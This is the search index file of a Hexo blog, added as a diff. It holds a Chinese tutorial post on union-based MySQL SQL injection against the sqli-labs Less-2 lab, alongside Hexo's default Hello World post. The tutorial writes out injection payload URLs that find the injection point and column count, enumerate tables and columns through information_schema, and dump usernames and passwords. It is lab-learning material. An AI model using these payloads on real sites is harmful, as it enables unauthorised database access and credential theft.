@@ -1,0 +1,33 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search> 
+  
+  
+    
+    <entry>
+      <title></title>
+      <link href="/2022/10/08/sql_get/"/>
+      <url>/2022/10/08/sql_get/</url>
+      
+        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><pre><code>mysql5.0以上版本 有一个数据库information_schema包含数据库所有表名，列名，数据库名。数据库中&quot;.&quot;                  ##表示下一级 information——schema.tables  ##记录所有信息表名的表information——schema.columns ##记录所有列名信息的表</code></pre><h2 id="一些基本常识"><a href="#一些基本常识" class="headerlink" title="一些基本常识"></a>一些基本常识</h2><pre><code>数据库版本：version() 数据库名字：database() 数据库用户：user() 操作系统:@@version_compile_os </code></pre><p>1：判断是否存在注入点</p><pre><code>?id=1 and 1=1 正常?id=1 and 1=2 错误（存在注入）</code></pre><p>2：使用order by 判断</p><pre><code>?id=1 and 1=2 order by 4--+ ##报错，说明列数比4小?id=1 and 1=2 order by 4--+ ##正常  </code></pre><p>3：使用union select 查询数据回显位置</p><pre><code>http://qwer/sqli-labs/Less-2/?id=-1 union select 1,2,3#</code></pre><p>4：查询数据库版本，名字</p><pre><code>http://qwer/sqli-labs/Less-2/?id=-1union select 1,@@version,3#http://qwer/sqli-labs/Less-2/?id=-1 union select 1，database(),3#  （security）</code></pre><p>5：查询表名字</p><pre><code>http://qwer/sqli-labs/Less-2/?id=-1 union select 1,table_name,3 from information_schema.tables where table_schema = &#39;security&#39;http://qwer/sqli-labs/Less-2/?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = &#39;security&#39;#        （emails,referers,uagents,users）##group_concat()显示当前数据库下的表</code></pre><p>6:查询指定表名下的列</p><pre><code>http://qwer/sqli-labs/Less-2/?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name = &#39;users&#39;#  ##(ame:user_id,first_name,last_name,user,password,avatar,last_login,failed_login,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password)##查询出来的列名</code></pre><p>7:查询指定数据</p><pre><code>http://qwer/sqli-labs/Less-2/?id=-1 union select 1,group_concat(id,username,password),3 from users#  爆出id，username，password字段内容</code></pre>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Hello World</title>
+      <link href="/2022/10/07/hello-world/"/>
+      <url>/2022/10/07/hello-world/</url>
+      
+        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+  
+  
+</search>
